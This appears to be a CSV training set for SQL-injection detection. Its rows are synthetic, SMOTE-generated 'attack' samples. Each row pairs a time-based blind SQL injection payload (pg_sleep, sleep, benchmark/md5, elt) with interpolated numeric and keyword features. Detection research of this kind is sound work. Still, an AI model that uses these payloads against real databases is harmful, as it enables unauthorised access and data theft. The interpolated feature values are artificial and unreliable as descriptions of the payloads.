id,label,payload_type,payload,retrieval_method,retrieval_source_id,retrieval_distance,length,num_unique_chars,entropy,alpha_count,digit_count,space_count,punct_count,alpha_ratio,digit_ratio,space_ratio,punct_ratio,single_quote_count,double_quote_count,dash_count,slash_count,star_count,equals_count,semicolon_count,paren_count,percent_count,underscore_count,comma_count,operator_count,has_single_quote,has_double_quote,has_comment_dashdash,has_comment_hash,has_comment_block,has_equal,has_parentheses,has_semicolon,has_percent_encoding,has_hex_literal,has_concat_operator,kw_select,kw_union,kw_where,kw_from,kw_and,kw_or,kw_insert,kw_update,kw_delete,kw_drop,kw_create,kw_alter,kw_sleep,kw_benchmark,kw_waitfor,kw_delay,kw_information_schema,kw_table,kw_column,kw_database,kw_cast,kw_convert,kw_concat,kw_substr,kw_substring,kw_ascii,kw_char,kw_load_file,kw_outfile,kw_exec,kw_order,kw_by,kw_exists,kw_case,kw_when,keyword_total
SMOTE_000096,attack,time,1 or 6793  =    (  select 6793 from pg_sleep  (  5   )    )   # awpq,nearest_attack_euclidean,R000123,0.21760522688042255,67.77202199074162,25.696029320988828,3.6053584160511956,22.69602932098883,10.0,28.075992669752793,7.0,0.3347451330407654,0.14757461088067506,0.414378028462087,0.10330222761647254,0.0,0.0,0.0,0.0,0.0,1.0,0.0,4.075992669752793,0.0,0.9999999999999999,0.0,1.0,0.0,0.0,0.0,0.9240073302472074,0.0,1.0,1.0,0.0,0.0,0.0,0.0,1.0,0.0,0.0,1.0,0.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,3.0
SMOTE_000097,attack,time,"1'  )   and 3824  =  benchmark  (  5000000,md5  (  0x76555642   )    )    and   (  'urxs'  =  'urxs",nearest_attack_euclidean,R000099,0.8260113634987711,96.2176542168473,27.747059474258847,3.757337599925329,26.0,21.747059474258844,35.97647579407076,12.49411894851769,0.27092986574402783,0.22637402378110483,0.37297982591515244,0.12971628455971493,4.0,0.0,0.0,0.0,0.0,2.0,0.0,5.4941189485176904,0.0,0.0,1.0,2.0,1.0,0.0,0.0,0.0,0.0,1.0,1.0,0.0,0.0,0.9999999999999999,0.0,0.0,0.0,0.0,0.0,1.7470594742588448,0.2529405257411549,0.0,0.0,0.0,0.0,0.0,0.0,0.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,3.0
SMOTE_000098,attack,time,"1 where 5466  =  5466 and 2388  =  benchmark  (  5000000,md5  (  0x6d457153   )    )   #",nearest_attack_euclidean,R000005,1.191194864826674,87.55852842577592,26.11705685155185,3.802188918253878,21.441471574224074,28.11705685155185,30.0,8.0,0.24492168254838353,0.3210689235356663,0.3426389951968028,0.09137039871914741,0.0,0.0,0.0,0.0,0.0,2.0,0.0,4.0,0.0,0.0,1.0,2.0,0.0,0.0,0.0,1.0,0.0,1.0,1.0,0.0,0.0,0.9999999999999999,0.0,0.0,0.0,1.0,0.0,0.5585284257759249,0.4414715742240751,0.0,0.0,0.0,0.0,0.0,0.0,0.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,3.0
SMOTE_000099,attack,time,"1""   )    )     )   rlike sleep  (  5  )   and    (    (     (  ""eefg""  =  ""eefg",nearest_attack_euclidean,R000023,1.9234225345488223,77.33662179761505,18.556103632935844,2.6196164758123164,17.448829063486745,2.0,44.0,13.887792734128315,0.22395899785963233,0.02589978993323816,0.5697953785312395,0.1803458336758901,0.0,4.0,0.0,0.0,0.0,1.0,0.0,8.0,0.8877927341283138,0.0,0.0,1.0,0.0,1.0,0.0,0.0,0.0,1.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,2.0
SMOTE_000100,attack,time,"select pg_sleep  (  5  )   and    (    (     (  ""nvuv"" like ""nvuv",nearest_attack_euclidean,R000068,1.3243531891293128,63.859461272681614,19.619820424227203,3.271724463184093,27.239640848454407,1.0,27.0,8.619820424227203,0.42642971203832547,0.015667627475761392,0.4230259418455575,0.13487671864035577,0.0,3.0,0.0,0.0,0.0,0.0,0.0,5.0,0.0,0.6198204242272037,0.0,2.220446049250313e-16,0.0,1.0,0.0,0.0,0.0,1.1102230246251565e-16,1.0,0.0,0.0,0.0,0.0,1.0,0.0,0.0,0.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.3801795757727962,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,2.3801795757727966
SMOTE_000101,attack,time,1   )    )    as msug where 3503  =  3503 and sleep  (  5  )  #,nearest_attack_euclidean,R000054,1.2741326533780557,62.51493010898111,21.514930108981112,3.273585779261791,18.514930108981112,10.0,28.0,6.0,0.2961231246275394,0.15997201713010467,0.44792164796429307,0.09598321027806281,0.0,0.0,0.0,0.0,0.0,1.0,0.0,4.0,0.0,0.0,0.0,1.0,0.0,0.0,0.0,1.0,0.0,1.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,1.0,0.0,0.5149301089811128,0.4850698910188873,0.0,0.0,0.0,0.0,0.0,0.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,3.0
SMOTE_000102,attack,time,1%'   )    )    or 4240  =    (  select 4240 from pg_sleep  (  5   )    )   --,nearest_attack_euclidean,R000121,0.39156039777403895,79.82310737106177,24.0,3.248327941391147,19.0,10.0,38.352589475884805,12.470517895176961,0.23915848633121098,0.12587288754274262,0.47879136675460826,0.15617725937143812,1.0,0.0,2.0,0.0,0.0,1.0,0.0,6.470517895176961,1.0,0.9999999999999999,0.0,3.0,1.0,0.0,1.0,0.0,0.0,1.0,1.0,0.0,0.0,0.0,0.0,1.0,0.0,0.0,1.0,0.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,3.0
SMOTE_000103,attack,time,"1   )    )    or benchmark  (  10000000,MD5  (  1   )    )   #",nearest_attack_euclidean,R000002,1.4034184716804219,64.87442945708625,20.862328837125876,3.1369697412511632,14.1497717828345,13.299543565669003,29.425114108582747,8.0,0.21727559757921544,0.2022744124201455,0.45656903920688685,0.12388095079375223,0.0,0.0,0.0,0.0,0.0,0.2874429457086254,0.0,5.712557054291374,0.0,0.0,1.0,0.2874429457086254,0.0,0.0,0.0,1.0,0.0,0.2874429457086255,1.0,0.0,0.0,0.2874429457086254,0.0,0.0,0.0,0.0,0.0,0.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,2.0
SMOTE_000104,attack,time,"1%""  )   and 8594  =    (  select 8594 from pg_sleep  (  5   )    )   --",nearest_attack_euclidean,R000197,0.2681086375424553,71.90271244664876,26.7081373399463,3.558744010614296,19.902712446648767,10.0,31.0,11.0,0.27678815477811736,0.1390792010042082,0.43114552311304544,0.15298712110462903,0.0,1.0,2.0,0.0,0.0,1.0,0.0,5.0,1.0,0.9999999999999999,0.0,3.0,0.0,1.0,1.0,0.0,0.0,1.0,1.0,0.0,0.0,0.0,0.0,1.0,0.0,0.0,1.0,0.9027124466487668,0.09728755335123318,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,3.0
SMOTE_000105,attack,time,1'  )   or   (  select * from   (  select  (  sleep  (  5   )    )     )  ydpu  ) ,nearest_attack_euclidean,R000125,1.1254370799024347,81.25610355571268,20.0,2.9677813856421964,27.0,2.0,40.88415533356902,11.37194822214366,0.33233006158471917,0.024617041598868086,0.5030098152458425,0.14004308157057022,1.0,0.0,0.0,0.0,1.0,0.0,0.0,8.62805177785634,0.37194822214365936,0.0,0.0,1.0,1.0,0.0,0.0,0.3719482221436594,0.0,1.1102230246251565e-16,1.0,0.0,0.0,0.0,0.0,2.0,0.0,0.0,1.0,0.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,5.0
SMOTE_000106,attack,time,"1"" where 6686  =  6686 or elt  (  6272  =  6272,sleep  (  5   )    )   --",nearest_attack_euclidean,R000299,1.2054313296148047,75.0640971780142,22.0,3.315839256275326,15.0,18.0,32.04273145200946,10.02136572600473,0.20014931309291084,0.240179175711493,0.4264874909551737,0.13318402024042253,0.0,0.5106828630023652,2.0,0.0,0.0,2.0,0.0,4.510682863002366,0.0,0.0,1.0,4.0,0.0,0.5106828630023652,1.0,0.0,0.0,1.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,1.0,0.0,0.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,3.0
SMOTE_000107,attack,time,"1""   )    )    as ydkd where 2455  =  2455 and sleep  (  5  )  --",nearest_attack_euclidean,R000076,0.6971737648757894,63.60322766734411,22.399077809330254,3.4039064561069052,19.0,10.0,26.802766572009237,7.800461095334873,0.29934712846696604,0.15755112024577161,0.4205011810331473,0.12260057025411508,0.19953890466512747,0.8004610953348725,2.0,0.0,0.0,1.0,0.0,3.8004610953348728,0.0,0.0,0.0,3.0,0.19953890466512747,0.8004610953348725,1.0,0.0,0.0,1.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,1.0,0.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,3.0
SMOTE_000108,attack,time,"1"" or 6793  =    (  select 6793 from pg_sleep  (  5   )    )   ",nearest_attack_euclidean,R000042,0.5258634318112297,63.44156398867972,22.77921800566014,3.43849973559079,19.0,10.0,27.441563988679718,7.0,0.2995385309438548,0.15765185839150253,0.4324533097905909,0.11035630087405177,0.0,0.7792180056601415,0.0,0.0,0.0,1.0,0.0,4.220781994339858,0.0,0.9999999999999999,0.0,1.0,0.0,0.7792180056601415,0.0,0.0,0.0,1.0,1.0,0.0,0.0,0.0,0.0,1.0,0.0,0.0,1.0,0.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,3.0
SMOTE_000109,attack,time,"1"" and 6969  =    (  select 6969 from pg_sleep  (  5   )    )    and ""ojpe"" like ""ojpe",nearest_attack_euclidean,R000284,1.556330821596189,90.2217496087876,27.46908328986529,3.693384269849781,34.53091671013471,10.0,34.75266631892231,10.938166579730577,0.3839531947079583,0.1111116895853273,0.3839479884400126,0.1209871272667018,0.0,4.0,0.0,0.0,0.0,1.0,0.0,4.938166579730577,0.0,0.9999999999999999,0.0,1.0,0.0,1.0,0.0,0.0,0.0,1.0,1.0,0.0,0.0,0.0,0.0,1.0,0.0,0.0,1.0,1.5309167101347114,0.4690832898652886,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,4.0
SMOTE_000110,attack,time,"1%' and 2388  =  benchmark  (  5000000,md5  (  0x6d457153   )    )   #",nearest_attack_euclidean,R000091,0.4445730709123852,70.43383766309357,27.710774891270958,3.8338591495665355,16.0,21.0,24.57845021745809,8.855387445635477,0.22721303275743698,0.29821710549413605,0.34874352471777315,0.12582633703065388,0.8553874456354779,0.0,0.0,0.0,0.0,1.0,0.0,4.144612554364523,0.855387445635478,0.0,1.0,1.0,0.8553874456354778,0.0,0.0,1.0,0.0,1.0,1.0,0.0,0.0,0.9999999999999999,0.0,0.0,0.0,0.0,0.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,2.0
SMOTE_000111,attack,time, (  select * from   (  select  (  sleep  (  5   )    )     )  srmq  )   and   (  'pags'  =  'pags,nearest_attack_euclidean,R000285,0.0633508900545115,96.83203743351851,22.0,3.155427651881604,35.80804278116401,1.0,46.0,14.023994652354498,0.36969379177162004,0.010328518048852403,0.47511183024721054,0.14486585993231696,3.0,0.0,0.0,0.0,1.0,1.0,0.0,9.0,0.023994652354498047,0.0,0.0,2.0,1.0,0.0,0.0,0.0,0.0,1.0,1.0,0.0,0.0,0.0,0.0,2.0,0.0,0.0,1.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,5.0
SMOTE_000112,attack,time,1'+  (  select dpkp where 4836  =  4836 and sleep  (  5   )    )   +',nearest_attack_euclidean,R000074,0.673757339387694,67.78517013610738,24.82645287658677,3.655715099283048,22.82645287658677,10.0,25.95871725952062,9.0,0.3370655295357684,0.14776725073373684,0.38217669407013166,0.13299052566036315,2.1735471234132304,0.0,0.0,0.0,0.0,1.0,0.0,3.8264528765867696,0.0,0.0,0.0,2.8264528765867696,1.0,0.0,0.0,0.1735471234132303,0.0,1.0,1.0,0.0,0.0,0.0,0.0,1.0,0.0,1.0,0.0,0.8264528765867696,0.17354712341323048,0.0,0.0,0.0,0.0,0.0,0.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,4.0
SMOTE_000113,attack,time,"1%""   )    )    or sleep  (  5  )   and    (    (   ""%""  =  """,nearest_attack_euclidean,R000240,2.153399775608784,68.56793350486237,16.527004155946102,2.5361231638526758,13.783966752431182,2.0,39.78396675243118,13.0,0.19696458097715105,0.029564431124180404,0.581302185591496,0.19216880230717248,0.0,4.0,0.0,0.0,0.0,1.0,0.0,6.945991688107796,1.0540083118922043,0.0,0.0,1.0,0.0,1.0,0.0,0.0,0.0,1.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,1.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,3.0
SMOTE_000114,attack,time,"1""  )   or 6793  =    (  select 6793 from pg_sleep  (  5   )    )    and   (  ""baia""  =  ""baia",nearest_attack_euclidean,R000006,0.36254394009863783,92.17916333375925,28.0,3.599687576149457,30.0,10.0,39.5433306670074,12.63583266675185,0.3260670086103372,0.10868900287011239,0.4282836101842156,0.1369603783353348,0.0,4.0,0.0,0.0,0.0,2.0,0.0,5.635832666751851,0.0,0.9999999999999999,0.0,2.0,0.0,1.0,0.0,0.0,0.0,1.0,1.0,0.0,0.0,0.0,0.0,1.0,0.0,0.0,1.0,1.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,4.0
SMOTE_000115,attack,time,1'   )    )     )   and sleep  (  5  )   and    (    (     (  'hwjy'  =  'hwjy,nearest_attack_euclidean,R000092,1.212909063244738,76.38198313825613,17.190991569128066,2.6035018098822986,16.84264418434151,2.0,44.0,13.539338953914623,0.21910052826776555,0.026217242472131003,0.5767793343868821,0.1779028948732213,4.0,0.0,0.0,0.0,0.0,1.0,0.0,8.0,0.5393389539146227,0.0,0.0,1.0,1.0,0.0,0.0,0.0,0.0,1.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,2.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,3.0
SMOTE_000116,attack,time," select sleep  (  5  )   and    (    (     (  ""uvzc"" like ""uvzc",nearest_attack_euclidean,R000281,1.4901434530858735,62.58731027806101,17.76193083418303,3.043023754898121,24.349241112244037,1.0,28.82537944387798,8.41268972193899,0.3888203079472064,0.015978671203773415,0.46071536538110713,0.13448565546791302,0.0,3.0,0.0,0.0,0.0,0.41268972193899034,0.0,5.0,0.0,0.0,0.0,0.41268972193899045,0.0,1.0,0.0,0.0,0.0,0.41268972193899034,1.0,0.0,0.0,0.0,0.0,1.0,0.0,0.0,0.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,3.0
SMOTE_000117,attack,time,1'   )    )    rlike sleep  (  5  )   and    (    (   'qitl' like 'qitl,nearest_attack_euclidean,R000126,0.031480910135237405,70.89439184977778,18.011734238913583,2.996023966372771,25.011734238913583,1.988265761086419,33.917860327604934,9.976531522172838,0.3529017116579782,0.028027734061240386,0.4783640982206965,0.14070645606008492,3.9882657610864185,0.0,0.0,0.0,0.0,0.0,0.0,5.988265761086419,0.0,0.0,0.0,2.220446049250313e-16,1.0,0.0,0.0,0.0,0.0,1.1102230246251565e-16,1.0,0.0,0.0,0.0,0.0,0.011734238913581274,0.0,0.0,0.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,2.011734238913581
SMOTE_000118,attack,time,"1""  )   as eoer where 8667  =  8667 or 6793  =    (  select 6793 from pg_sleep  (  5   )    )   --",nearest_attack_euclidean,R000286,1.0353381097899519,98.3851766979327,28.77035339586542,3.692223316320149,30.38517669793271,18.0,39.0,11.0,0.3088221001298108,0.18295885584799126,0.3964108543373144,0.11180818968488354,0.0,1.0,2.0,0.0,0.0,2.0,0.0,5.0,0.0,0.9999999999999999,0.0,4.0,0.0,1.0,1.0,0.0,0.0,1.0,1.0,0.0,0.0,0.0,0.0,1.0,0.0,1.0,1.0,0.38517669793271,0.6148233020672901,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,4.0
SMOTE_000119,attack,time,"1   )    )    as hrks where 7637  =  7637 or elt  (  6272  =  6272,sleep  (  5   )    )   --",nearest_attack_euclidean,R000219,1.2708356526054951,86.25796004660836,22.589854289043455,3.2537703830605653,18.539125734260722,18.0,38.71883431234763,11.0,0.21351482811778305,0.21005528416402586,0.44806276961795305,0.12836711810023804,0.0,0.41014571095654606,2.0,0.0,0.0,2.0,0.0,5.589854289043454,0.0,0.0,1.0,4.0,0.0,0.41014571095654606,1.0,0.0,0.0,1.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,1.0,0.0,0.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,3.0
SMOTE_000120,attack,time,"1""  )   and sleep  (  5  )   and   (  ""fsuf"" like ""fsuf",nearest_attack_euclidean,R000279,0.24454169191123418,55.7102275222837,17.177556880570926,3.270063698024546,23.26633532085639,1.911221559714539,22.532670641712777,8.0,0.41769500999554865,0.03454451103599773,0.4039457084571317,0.14381477051132188,0.0,3.911221559714537,0.0,0.0,0.0,0.0,0.0,4.088778440285463,0.0,0.0,0.0,2.220446049250313e-16,0.0,1.0,0.0,0.0,0.0,1.1102230246251565e-16,1.0,0.0,0.0,0.0,0.0,0.08877844028546289,0.0,0.0,0.0,1.9112215597145372,0.0,0.0,0.0,0.0,0.0,0.0,0.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,3.0
SMOTE_000121,attack,time,"1' where 5702  =  5702 and elt  (  3114  =  3114,sleep  (  5   )    )   #",nearest_attack_euclidean,R000012,1.5171368709308353,72.18452260458078,22.96130651145196,3.439347448286127,15.592261302290392,18.0,30.0,8.592261302290392,0.2159526747817685,0.24940740750869106,0.41567901251448514,0.11896090519505528,0.5922613022903916,0.0,0.0,0.0,0.0,2.0,0.0,4.0,0.0,0.0,1.0,2.0,0.5922613022903916,0.0,0.0,1.0,0.0,1.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,1.0,0.0,0.5922613022903918,0.40773869770960836,0.0,0.0,0.0,0.0,0.0,0.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,3.0
SMOTE_000122,attack,time,1' and 6969  =    (  select 6969 from pg_sleep  (  5   )    )    and 'dgvg'  =  'dgvg,nearest_attack_euclidean,R000141,0.030873675690932766,84.9571954917399,25.012229859502888,3.631924331010489,30.944965632237,10.0,33.0,11.012229859502888,0.3642004552784628,0.11771162067610876,0.3884483482311589,0.1296395758142695,4.0,0.0,0.0,0.0,0.0,2.0,0.0,4.0,0.012229859502888463,0.9999999999999999,0.0,2.0,1.0,0.0,0.0,0.0,0.0,1.0,1.0,0.0,0.0,0.0,0.0,1.0,0.0,0.0,1.0,1.9938850702485555,0.006114929751444287,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,4.0
SMOTE_000123,attack,time,1'   )    )    and sleep  (  5  )   and    (    (   'tcwt'  =  'tcwt,nearest_attack_euclidean,R000204,1.60460225893879,69.89255423496763,18.514043387974105,3.0371947854147647,20.135532540980577,5.028086775948211,33.72893491803884,11.0,0.287723143094741,0.07012989369350182,0.48457607211277326,0.1575708910989839,4.0,0.0,0.0,0.0,0.0,1.3785108469935263,0.0,5.242978306012947,0.0,0.0,0.37851084699352644,1.3785108469935263,1.0,0.0,0.0,0.0,0.0,1.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,2.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,3.0
SMOTE_000124,attack,time,1'  )   as jxtg where 1071  =  1071 and sleep  (  5  )  --,nearest_attack_euclidean,R000295,0.8263728215578041,59.65561980637119,23.526965769608232,3.557191267891911,19.0,10.0,23.419102691175304,7.236517115195884,0.3192422343975988,0.16802222863031516,0.391481252081698,0.12125428489038806,0.7634828848041157,0.23651711519588414,2.0,0.0,0.0,1.0,0.0,3.236517115195884,0.0,0.0,0.0,3.0,0.763482884804116,0.23651711519588417,1.0,0.0,0.0,1.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,1.0,0.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,3.0
SMOTE_000125,attack,time,"1  )   or 8514  =  benchmark  (  5000000,md5  (  0x544d5a4c   )    )   #",nearest_attack_euclidean,R000101,0.03640088886637052,71.96451243114456,23.023658379236963,3.497201844333503,17.0,19.0,27.952683241526074,8.011829189618481,0.23623254602869215,0.2640246102673618,0.3884031492185648,0.11133969448538127,0.011829189618481006,0.0,0.0,0.0,0.0,1.0,0.0,4.9881708103815185,0.011829189618481117,0.0,1.0,1.0,0.011829189618481006,0.0,0.0,1.0,0.0,1.0,1.0,0.0,0.0,0.9999999999999999,0.0,0.0,0.0,0.0,0.0,0.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,2.0
SMOTE_000126,attack,time,select pg_sleep  (  5  )   and    (    (     (  'xobx'  =  'xobx,nearest_attack_euclidean,R000028,0.7783472029930396,63.330243237524456,19.776747745841487,3.168860647238094,23.553495491682973,1.0,29.0,9.776747745841487,0.37179761110838194,0.015796556547765253,0.45810013988519227,0.1543056924586605,3.0,0.0,0.0,0.0,0.0,1.0,0.0,5.0,0.0,0.776747745841486,0.0,1.0,1.0,0.0,0.0,0.0,0.0,1.0,1.0,0.0,0.0,0.0,0.0,1.0,0.0,0.0,0.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.22325225415851385,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,2.223252254158514
SMOTE_000127,attack,time,1'   )    )    and sleep  (  5  )   and    (    (   'tcwt'  =  'tcwt,nearest_attack_euclidean,R000204,0.3187514677609617,68.29039299963108,17.435589499446614,2.82370964320625,19.290392999631077,2.0,36.0,11.0,0.28240110440796695,0.029289750840491152,0.5272155151288406,0.1610936296227013,4.0,0.0,0.0,0.0,0.0,1.0,0.0,6.0,0.0,0.0,0.0,1.0,1.0,0.0,0.0,0.0,0.0,1.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,1.8548035001844618,0.0,0.0,0.0,0.0,0.0,0.0,0.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,2.854803500184462
